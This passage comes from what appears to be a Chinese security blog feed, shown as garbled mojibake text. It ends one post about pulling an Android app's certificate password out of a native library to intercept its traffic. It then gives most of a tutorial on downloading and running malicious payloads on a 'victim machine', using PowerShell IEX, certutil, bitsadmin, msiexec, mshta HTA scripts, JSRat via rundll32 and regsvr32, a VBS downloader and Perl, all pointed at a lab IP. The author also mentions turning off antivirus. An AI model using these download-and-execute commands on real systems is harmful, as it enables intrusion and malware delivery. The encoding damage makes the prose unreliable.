ä¸ªå€¼ï¼Œç”±äºæˆ‘æ˜¯èœé¸¡å¯¹JAVAä¸æ˜¯å¾ˆæ‡‚ï¼Œå°±æ¯ä¸€ä¸ªå€¼éƒ½çœ‹äº†ä¸€éï¼Œå‘ç°<code>SoulNetworkSDK.b().a(SoulNetworkSDK.b().g())</code>ä¸­çš„bå’Œgéƒ½æ˜¯è¿”å›å€¼å¹¶ä¸”ä¸èƒ½è·Ÿè¿›äº†ï¼Œè€Œaå‡½æ•°å¯ä»¥è·Ÿè¿›å¹¶ä¸”å‡½æ•°åä¸º<code>getStorePassword</code>ï¼Œé‚£ç™¾åˆ†ä¹‹90å¯ä»¥ç¡®å®šaå‡½æ•°å°±æ˜¯æˆ‘ä»¬éœ€è¦çš„å‡½æ•°</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/HttpCertificate/16.png" alt="image-20200720155254344"></p><p>ç»§ç»­è·Ÿè¿›å®ƒ</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/HttpCertificate/17.png" alt="image-20200720155408539"></p><p>å†æ¥ç€è·Ÿè¿›ï¼Œçœ‹åˆ°äº†<code>private native String getStorePassword(String arg1)</code>è¿™ä¸ªå£°æ˜æ–¹æ³•ï¼Œwtf?çº¿ç´¢æ–­äº†ï¼Ÿæ¥ç€æˆ‘ç™¾åº¦äº†ä¸€ä¸‹<code>native</code>æ–¹æ³•å‘ç°ï¼Œ<code>native</code>å…³é”®å­—è¯´æ˜å…¶ä¿®é¥°çš„æ–¹æ³•æ˜¯ä¸€ä¸ªåŸç”Ÿæ€æ–¹æ³•ï¼Œæ–¹æ³•å¯¹åº”çš„å®ç°ä¸æ˜¯åœ¨å½“å‰æ–‡ä»¶ï¼Œè€Œæ˜¯åœ¨ç”¨å…¶ä»–è¯­è¨€ï¼ˆå¦‚Cå’ŒC++ï¼‰å®ç°çš„æ–‡ä»¶ä¸­<strong>ã€‚</strong>Javaè¯­è¨€æœ¬èº«ä¸èƒ½å¯¹æ“ä½œç³»ç»Ÿåº•å±‚è¿›è¡Œè®¿é—®å’Œæ“ä½œï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡JNIæ¥å£è°ƒç”¨å…¶ä»–è¯­è¨€æ¥å®ç°å¯¹åº•å±‚çš„è®¿é—®ã€‚ç„¶åçœ‹æ¥ä¸‹ç”¨ä¾‹ï¼ŒåŸæ¥ ä¼šåŠ è½½ä¸€ä¸ªæ–‡ä»¶ä¸€æ ·çš„ä¸œè¥¿ï¼Œå¤§æ¦‚çš„ä¾‹å­å’Œä¸‹é¢ç±»ä¼¼ï¼Œç„¶åæˆ‘ä»¬æ‰¾è¿™ä¸ªç±»æœ‰ä»€ä¹ˆæ–‡ä»¶åŠ è½½çš„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">hello</span><span class="params">(String name)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">new</span> HelloWorld().hello(<span class="string">&quot;jni&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€åå†å¼€å¤´çš„åœ°æ–¹æ‰¾åˆ°äº†</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/HttpCertificate/18.png" alt="image-20200720160536948"></p><p>soul-netsdkå°±æ˜¯è°ƒç”¨çš„libsoul-netsdk.soæ–‡ä»¶ï¼Œç„¶åæˆ‘ä»¬å»è§£å‹çš„æ–‡ä»¶ä¸­æ‰¾è¿™ä¸ªåå­—</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/HttpCertificate/19.png" alt="image-20200720161228991"></p><p>æˆ‘ä»¬ç”¨IDAæ‰“å¼€å®ƒï¼Œç„¶åå…¨å±€æœç´¢ä¹‹å‰æ‰¾åˆ°çš„é‚£ä¸ªå‡½æ•°å<code>getStorePassword</code>ï¼Œä¸ºä»€ä¹ˆè¦æœç´¢è¿™ä¸ªå‡½æ•°åå‘¢ï¼Œå› ä¸º**.SO<strong>æ–‡ä»¶æ˜¯Linuxä¸‹çš„åŠ¨æ€é“¾æ¥,å…¶åŠŸèƒ½å’Œä½œç”¨ç±»ä¼¼ä¸windowsä¸‹</strong>.dll**æ–‡ä»¶ï¼Œè€Œ<code>getStorePassword</code>å°±ç±»ä¼¼äºä¸€ä¸ªå¯¼å‡ºå‡½æ•°</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/HttpCertificate/20.png" alt="image-20200720161659826"></p><p>ç„¶åF5å³å¯çœ‹åˆ°ä¼ªä»£ç äº†ï¼Œå¹¶ä¸”å¯†ç ä¹Ÿå‡ºæ¥äº†</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/HttpCertificate/21.png" alt="image-20200720161930289"></p><p>åˆ©ç”¨è¿™ä¸ªå¯†ç å’Œä¹‹å‰é‚£ä¸ªè¯ä¹¦è¿›è¡Œå®‰è£…</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/HttpCertificate/22.png" alt="image-20200720162120605"></p><p>å®‰è£…æˆåŠŸ</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/HttpCertificate/23.png" alt="image-20200720162727493"></p><p>æ¥ç€æˆ‘ä»¬å†æ¬¡å°è¯•æŠ“åŒ…ï¼ŒæˆåŠŸ</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/HttpCertificate/24.png" alt="image-20200720162849793"></p><p>å‚è€ƒæ–‡ç« </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;042ce0b88f03</span><br><span class="line">https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;0uItUS5P8gFQ1Cu5-jkCgQ</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>æ¶æ„ç¨‹åºç ”ç©¶ä¹‹è¿œç¨‹ä¸‹è½½æ¶æ„ç¨‹åº</title>
    <link href="https://www.ascotbe.com/2020/07/12/RemoteDownload/"/>
    <id>https://www.ascotbe.com/2020/07/12/RemoteDownload/</id>
    <published>2020-07-12T07:45:42.000Z</published>
    <updated>2021-05-17T00:31:53.389Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>å£°æ˜</p></blockquote><p>éƒ‘é‡å£°æ˜ï¼šæ–‡ä¸­æ‰€æ¶‰åŠçš„æŠ€æœ¯ã€æ€è·¯å’Œå·¥å…·ä»…ä¾›ä»¥å®‰å…¨ä¸ºç›®çš„çš„å­¦ä¹ äº¤æµä½¿ç”¨ï¼Œä»»ä½•äººä¸å¾—å°†å…¶ç”¨äºéæ³•ç”¨é€”ä»¥åŠç›ˆåˆ©ç­‰ç›®çš„ï¼Œå¦åˆ™åæœè‡ªè¡Œæ‰¿æ‹…ï¼</p><h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>æˆ‘çŸ¥é“ä¸Šç¯‡æ–‡ç« æ²¡æœ‰å†™å®Œï¼Œä½†æ˜¯æŠŠçœ‹åˆ°ä»€ä¹ˆå­¦ä»€ä¹ˆï¼Œè¦ç»ˆç»“çš„å˜›ä½ è¯´æ˜¯å§ï¼ˆps:åç»­æœ‰å…¶ä»–æ–¹æ³•ä¹Ÿä¼šæ›´æ–°åˆ°è¿™é‡Œçš„</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/RemoteDownload/1.jpg" alt="img"></p><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><h4 id="å‘½ä»¤è¡Œè‡ªå¸¦å·¥å…·"><a href="#å‘½ä»¤è¡Œè‡ªå¸¦å·¥å…·" class="headerlink" title="å‘½ä»¤è¡Œè‡ªå¸¦å·¥å…·"></a>å‘½ä»¤è¡Œè‡ªå¸¦å·¥å…·</h4><h5 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h5><p>PowerShellæ˜¯ä¸€ç§è·¨å¹³å°çš„ä»»åŠ¡è‡ªåŠ¨åŒ–å’Œé…ç½®ç®¡ç†æ¡†æ¶ï¼Œç”±å‘½ä»¤è¡Œç®¡ç†ç¨‹åºå’Œè„šæœ¬è¯­è¨€ç»„æˆï¼Œä¸å¤§å¤šæ•°æ¥å—å¹¶è¿”å›æ–‡æœ¬çš„ shell ä¸åŒï¼ŒPowerShellæ„å»ºåœ¨ .NETå…¬å…±è¯­è¨€è¿è¡Œæ—¶ (CLR) çš„åŸºç¡€ä¹‹ä¸Šï¼Œæ¥å—å¹¶è¿”å›.NETå¯¹è±¡ï¼Œè¿™ä»æ ¹æœ¬ä¸Šçš„æ”¹å˜å¼•å…¥äº†å…¨æ–°çš„è‡ªåŠ¨åŒ–å·¥å…·å’Œæ–¹æ³•ã€‚</p><p>è¿œç¨‹ä¸‹è½½æ–‡ä»¶åˆ°æœ¬åœ°ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell (new-object System.Net.WebClient).DownloadFile(<span class="string">&#x27;http://192.168.183.138:8000/test.txt&#x27;</span>,<span class="string">&#x27;test.exe&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/RemoteDownload/2.png" alt="image-20200711233252456"></p><p>ç›´æ¥æŠŠæ–‡æœ¬è½¬æ¢ä¸ºexeæ–‡ä»¶è¿è¡Œï¼Œæ— æ®‹ç•™æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -w hidden -c <span class="string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.183.138:8000/test.txt&#x27;))&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/RemoteDownload/3.png" alt="image-20200711233807215"></p><p>å¯ä»¥å‘ç°æ‰§è¡Œäº†ï¼Œç«ç»’éƒ½è·‘å‡ºæ¥äº†23333</p><h5 id="certutil"><a href="#certutil" class="headerlink" title="certutil"></a>certutil</h5><p>certutil.exeæ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œç¨‹åºï¼Œä½œä¸ºè¯ä¹¦æœåŠ¡çš„ä¸€éƒ¨åˆ†å®‰è£…ï¼Œä½ å¯ä»¥ä½¿ç”¨Certutil.exeè½¬å‚¨å’Œæ˜¾ç¤ºè¯ä¹¦é¢å‘æœºæ„ï¼ˆCAï¼‰é…ç½®ä¿¡æ¯ï¼Œé…ç½®è¯ä¹¦æœåŠ¡ï¼Œå¤‡ä»½å’Œè¿˜åŸCAç»„ä»¶ï¼Œä»¥åŠéªŒè¯è¯ä¹¦ï¼Œå¯†é’¥å¯¹å’Œè¯ä¹¦é“¾ã€‚</p><p>å¯ä»¥å€ŸåŠ©certutilæ¥å®ç°è¿œç¨‹ä¸‹è½½æ–‡ä»¶åˆ°æœ¬åœ°ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f http://192.168.183.138:8000/test.txt test.exe</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/RemoteDownload/4.png" alt="image-20200711234529773"></p><h5 id="Bitsadmin"><a href="#Bitsadmin" class="headerlink" title="Bitsadmin"></a>Bitsadmin</h5><p>BITSAdminæ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œå¯ç”¨äºåˆ›å»ºä¸‹è½½æˆ–ä¸Šä¼ å¹¶ç›‘è§†å…¶è¿›åº¦ï¼Œè‡ªwindows7 ä»¥ä¸Šç‰ˆæœ¬å†…ç½®bitsadminï¼Œå®ƒå¯ä»¥åœ¨ç½‘ç»œä¸ç¨³å®šçš„çŠ¶æ€ä¸‹ä¸‹è½½æ–‡ä»¶ï¼Œå‡ºé”™ä¼šè‡ªåŠ¨é‡è¯•ï¼Œåœ¨æ¯”è¾ƒå¤æ‚çš„ç½‘ç»œç¯å¢ƒä¸‹ï¼Œæœ‰ç€ä¸é”™çš„æ€§èƒ½ã€‚</p><p>å¯ä»¥é€šè¿‡åœ¨ç›®æ ‡ä¸»æœºä¸Šæ‰§è¡Œä»¥ä¸‹å‘½ä»¤æ¥å®ç°è¿œç¨‹æ–‡ä»¶ä¸‹è½½ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer n http://192.168.183.138:8000/test.txt F:\ascotbe\test.ext</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/RemoteDownload/5.png" alt="image-20200711234735873"></p><h5 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h5><p>FTP(File Transfer Protocolï¼Œæ–‡ä»¶ä¼ è¾“åè®®)æ˜¯TCP/IP åè®®ç»„ä¸­çš„åè®®ä¹‹ä¸€ã€‚FTPåè®®åŒ…æ‹¬ä¸¤ä¸ªç»„æˆéƒ¨åˆ†ï¼Œå…¶ä¸€ä¸ºFTPæœåŠ¡å™¨ï¼Œå…¶äºŒä¸ºFTPå®¢æˆ·ç«¯ï¼Œå…¶ä¸­FTPæœåŠ¡å™¨ç”¨æ¥å­˜å‚¨æ–‡ä»¶ï¼Œç”¨æˆ·å¯ä»¥ä½¿ç”¨FTPå®¢æˆ·ç«¯é€šè¿‡FTPåè®®è®¿é—®ä½äºFTPæœåŠ¡å™¨ä¸Šçš„èµ„æºã€‚</p><p>é¦–å…ˆåˆ©ç”¨<strong>FileZilla</strong>æ¥æ­å»ºä¸ªæœåŠ¡å™¨</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/RemoteDownload/6.png" alt="image-20200712000827946"></p><p>åœ¨ç›®æ ‡ä¸»æœºä¸Šè¿œç¨‹ä¸‹è½½<code>test.txt</code>æ–‡ä»¶</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/RemoteDownload/7.png" alt="image-20200712001918698"></p><h5 id="msiexec"><a href="#msiexec" class="headerlink" title="msiexec"></a>msiexec</h5><p>msiexecæ˜¯windowsè‡ªå¸¦çš„cmdå·¥å…·ï¼Œæ”¯æŒè¿œç¨‹ä¸‹è½½åŠŸèƒ½ï¼Œæ”»å‡»è€…å¯ä»¥å°†msiæ–‡ä»¶ä¸Šä¼ åˆ°æœåŠ¡å™¨å¹¶æ‰§è¡Œï¼Œä¸‹é¢é€šè¿‡ä¸€ä¸ªå®ä¾‹åšæ¼”ç¤ºè¯´æ˜ï¼Œé¦–å…ˆæˆ‘ä»¬é€šè¿‡msfvenomæ¥æ„é€ ä¸€ä¸ªæ¶æ„çš„msiç¨‹åº(è¿™é‡Œä»¥å¼¹è®¡ç®—å™¨ä¸ºä¾‹ï¼Œåœ¨å®æˆ˜ä¸­å¯ä»¥æ ¹æ®éœ€è¦è¿›è¡Œä¿®æ”¹)ï¼Œå¹¶å¯åŠ¨ä¸€ä¸ªç®€æ˜“</p><p>åˆ¶ä½œæœåŠ¡ï¼š</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/RemoteDownload/8.png" alt="image-20200712002447041"></p><p>ç„¶åè¿è¡Œå‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msiexec /q /i http://192.168.183.138:8000/ascotbe.msi</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/RemoteDownload/9.png" alt="image-20200712002628204"></p><p>è¿˜æ˜¯æŠŠç«ç»’ç»™å…³äº†ä¸ç„¶ç›´æ¥ç»™æˆ‘æ‹¦æˆªäº†</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/RemoteDownload/10.png" alt="image-20200712002748059"></p><h5 id="mshta"><a href="#mshta" class="headerlink" title="mshta"></a>mshta</h5><p>mshta.exeæ˜¯å¾®è½¯Windowsæ“ä½œç³»ç»Ÿç›¸å…³ç¨‹åºï¼Œè‹±æ–‡å…¨ç§°Microsoft HTML Applicationï¼Œå¯ç¿»è¯‘ä¸ºå¾®è½¯è¶…æ–‡æœ¬æ ‡è®°è¯­è¨€åº”ç”¨ï¼Œç”¨äºæ‰§è¡Œ.HTAæ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æœ¬åœ°æ„å»ºhtaæ–‡ä»¶ï¼Œä¹‹åé€šè¿‡ç›®æ ‡ä¸»æœºçš„mshtaæ¥è¿œç¨‹ä¸‹è½½å¹¶æ‰§è¡Œï¼Œä¾‹å¦‚åœ¨æœ¬åœ°åˆ›å»ºä»¥ä¸‹htaæ–‡ä»¶ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">HTML</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">HEAD</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;VBScript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">Set</span> objShell = CreateObject(<span class="string">&quot;Wscript.Shell&quot;</span>)</span></span><br><span class="line"><span class="javascript">objShell.Run <span class="string">&quot;cmd.exe /c calc.exe&quot;</span> <span class="comment">// å¾…æ‰§è¡Œçš„å‘½ä»¤</span></span></span><br><span class="line">self.close</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">Demo</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">HEAD</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">HTML</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨å—å®³æœºå™¨ä¸Šæ‰§è¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta  http://192.168.183.138:8000/ascotbe.hta</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/RemoteDownload/11.png" alt="image-20200712003050771"></p><p><del>è¿™é‡Œè¯´ä¸€å¥ï¼Œç«ç»’æ²¡æ‹¦æˆªï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿæœ‰ç‚¹æ„æ€</del></p><p>ä¹Ÿå¯ä»¥ç”¨<strong>MSF</strong>æˆ–è€…<strong>CS</strong>ç”Ÿäº§<code>hta</code>æ–‡ä»¶ï¼Œç›´æ¥å—å®³è€…æœºå™¨æ‰§è¡Œå°±èƒ½ä¸Šçº¿</p><h5 id="rundll32"><a href="#rundll32" class="headerlink" title="rundll32"></a>rundll32</h5><p>Rundll32.exeåŠŸèƒ½æ˜¯ä»¥å‘½ä»¤è¡Œçš„æ–¹å¼è°ƒç”¨åŠ¨æ€é“¾æ¥ç¨‹åºåº“ï¼Œç³»ç»Ÿä¸­è¿˜æœ‰ä¸€ä¸ªRundll64.exeæ–‡ä»¶ï¼Œå®ƒçš„æ„æ€æ˜¯â€æ‰§è¡Œ64ä½çš„DLLæ–‡ä»¶â€ï¼Œ å…¶å‘½ä»¤è¡Œä¸‹çš„ä½¿ç”¨æ–¹æ³•ä¸ºï¼šRundll32.exe DLLname,Functionname Argumentsï¼Œå…¶ä¸­DLLnameä¸ºéœ€è¦æ‰§è¡Œçš„DLLæ–‡ä»¶åï¼ŒFunctionnameä¸ºå‰è¾¹éœ€è¦æ‰§è¡Œçš„DLLæ–‡ä»¶çš„å…·ä½“å¼•å‡ºå‡½æ•°ï¼ŒArgumentsä¸ºå¼•å‡ºå‡½æ•°çš„å…·ä½“å‚æ•°ã€‚</p><p>ä¸¤ç¯‡è®²è§£å…³äºrundll32.exeåˆ©ç”¨çš„æ–‡ç« ï¼ŒæŒºå¥½ç”¨çš„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;3gstudent.github.io&#x2F;3gstudent.github.io&#x2F;%E5%85%B3%E4%BA%8E%E5%88%A9%E7%94%A8rundll32%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%9E%90&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;www.hexacorn.com&#x2F;blog&#x2F;2017&#x2F;05&#x2F;01&#x2F;running-programs-via-proxy-jumping-on-a-edr-bypass-trampoline&#x2F;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨JSRatæ¥åšæ¼”ç¤ºï¼Œé¡¹ç›®åœ°å€ï¼š<code>https://github.com/Hood3dRob1n/JSRat-Py</code></p><p>ä½¿ç”¨å‘½ä»¤å¦‚ä¸‹å‘½ä»¤æ¥å¼€å¯æœåŠ¡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python JSRat.py -i 192.168.183.138 -p 8023</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/RemoteDownload/12.png" alt="image-20200712004212163"></p><p>ç„¶åè®¿é—®<code>http://192.168.183.138:8023/wtf</code>è¿™è¾¹æœ‰æ•™ä½ æ€ä¹ˆç”¨</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/RemoteDownload/13.png" alt="image-20200712004339053"></p><p>æ‰§è¡Œå®Œå‘½ä»¤å¯ä»¥çœ‹åˆ°ç›®æ ‡å·²ç»è¿ä¸Šäº†</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/RemoteDownload/14.png" alt="image-20200712004613488"></p><p>æ³¨æ„ï¼šè¿™è¾¹<strong>powershell</strong>è¿è¡Œä¼šæŠ¥é”™ï¼Œéœ€è¦ä½¿ç”¨<strong>cmd</strong>æ‰è¡Œ</p><h5 id="regsvr32"><a href="#regsvr32" class="headerlink" title="regsvr32"></a>regsvr32</h5><p>Regsvr32å‘½ä»¤ç”¨äºæ³¨å†ŒCOMç»„ä»¶ï¼Œæ˜¯Windowsç³»ç»Ÿæä¾›çš„ç”¨æ¥å‘ç³»ç»Ÿæ³¨å†Œæ§ä»¶æˆ–è€…å¸è½½æ§ä»¶çš„å‘½ä»¤ï¼Œä»¥å‘½ä»¤è¡Œæ–¹å¼è¿è¡Œï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¯¥å‘½ä»¤æ¥å®ç°è¿œç¨‹æ–‡ä»¶ä¸‹è½½</p><p>æ­å»ºæœåŠ¡æ–¹å¼å’Œä¸Šé¢çš„ä¸€æ ·ï¼Œç„¶åè¿˜æ˜¯è®¿é—®é‚£ä¸ªURL</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/RemoteDownload/15.png" alt="image-20200712005441738"></p><p>æ‰§è¡Œè¿™ä¸ªå‘½ä»¤</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/RemoteDownload/16.png" alt="image-20200712005501136"></p><p>å¯ä»¥çœ‹åˆ°ç›´æ¥è¿ä¸Šäº†</p><h5 id="VisualBasic"><a href="#VisualBasic" class="headerlink" title="VisualBasic"></a>VisualBasic</h5><p>è‡ª1998å¹´ä»¥æ¥ï¼ŒVisual Basicçš„æœ€ç»ˆç‰ˆæœ¬å·²åœ¨Windowsè®¡ç®—æœºä¸Šæˆä¸ºæ ‡å‡†é…ç½®ã€‚ä»¥ä¸‹è„šæœ¬å¯ä»¥ä¸‹è½½æ‚¨é€‰æ‹©çš„æ–‡ä»¶ã€‚ä½†æ˜¯ï¼Œè¯¥è„šæœ¬æ¯”PowerShellè„šæœ¬å¤§å¾—å¤šã€‚</p><p>æŠŠè¿™æ®µä»£ç å†™åˆ°æ–‡æœ¬é‡Œé¢ç„¶åä¿å­˜ä¸º<strong>vbs</strong>åç¼€</p><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Set</span> Post = CreateObject(<span class="string">&quot;Msxml2.XMLHTTP&quot;</span>)</span><br><span class="line"><span class="keyword">Set</span> Shell = CreateObject(<span class="string">&quot;Wscript.Shell&quot;</span>)</span><br><span class="line">Post.Open <span class="string">&quot;GET&quot;</span>,<span class="string">&quot;http://192.168.183.138:8000/asctobe.hta&quot;</span>,<span class="number">0</span></span><br><span class="line">Post.Send()</span><br><span class="line"><span class="keyword">Set</span> aGet = CreateObject(<span class="string">&quot;ADODB.Stream&quot;</span>)</span><br><span class="line">aGet.Mode = <span class="number">3</span></span><br><span class="line">aGet.Type = <span class="number">1</span></span><br><span class="line">aGet.Open()</span><br><span class="line">aGet.Write(Post.responseBody)</span><br><span class="line">aGet.SaveToFile <span class="string">&quot;F:\ascotbe\ascotbe.hta&quot;</span>,<span class="number">2</span> <span class="comment">&#x27;ä¿å­˜åœ¨å“ªé‡Œ</span></span><br><span class="line">wscript.sleep <span class="number">1000</span></span><br><span class="line">Shell.Run (<span class="string">&quot;F:\ascotbe\ascotbe.hta&quot;</span>) <span class="comment">&#x27;å»¶è¿Ÿè¿‡åæ‰§è¡Œä¸‹è½½æ–‡ä»¶</span></span><br></pre></td></tr></table></figure><p>ç„¶åè¿è¡Œå‘½ä»¤æ‰§è¡Œä»–</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wscript .\test.vbs</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/RemoteDownload/17.png" alt="image-20200712124235161"></p><p>è¿˜æ˜¯ä¸»è¦ä¸‹è½½<code>exe</code>æ–‡ä»¶ï¼Œè¿è¡Œçš„è¯æ¯”è¾ƒæ–¹ä¾¿</p><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><h4 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h4><p>Perlæ˜¯ç›®å‰å¾ˆå—æ¬¢è¿çš„ä¸»æµè„šæœ¬è¯­è¨€ï¼Œlinuxä¸»æœºä¸€èˆ¬éƒ½è‡ªå¸¦perlç¯å¢ƒï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ç»ˆç«¯ä¸­ä½¿ç”¨vimæ¥ç¼–è¾‘ä¸€ä¸ªperlè„šæœ¬ï¼Œä¹‹åæ‰§è¡Œperlæ¥å®ç°è¿œç¨‹æ–‡ä»¶ä¸‹è½½</p><p>æŠŠä¸‹é¢ä»£ç ä¿å­˜ä¸º<code>test.pl</code></p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!perl</span></span><br><span class="line"><span class="comment">#!/usr/bin/perl</span></span><br><span class="line"><span class="keyword">use</span> LWP::Simple;</span><br><span class="line">getstore(<span class="string">&quot;http://192.168.1.7:8000/ascotbe.hta&quot;</span>,<span class="string">&quot;test.hta&quot;</span>);</span><br></pre></td></tr></table></figure><p>ç„¶åè¿è¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl test.pl</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/RemoteDownload/18.png" alt="image-20200712134650144"></p><h3 id="ç¬¬ä¸‰æ–¹è½¯ä»¶"><a href="#ç¬¬ä¸‰æ–¹è½¯ä»¶" class="headerlink" title="ç¬¬ä¸‰æ–¹è½¯ä»¶"></a>ç¬¬ä¸‰æ–¹è½¯ä»¶</h3><h4 id="Windows-Linuxé€šç”¨"><a 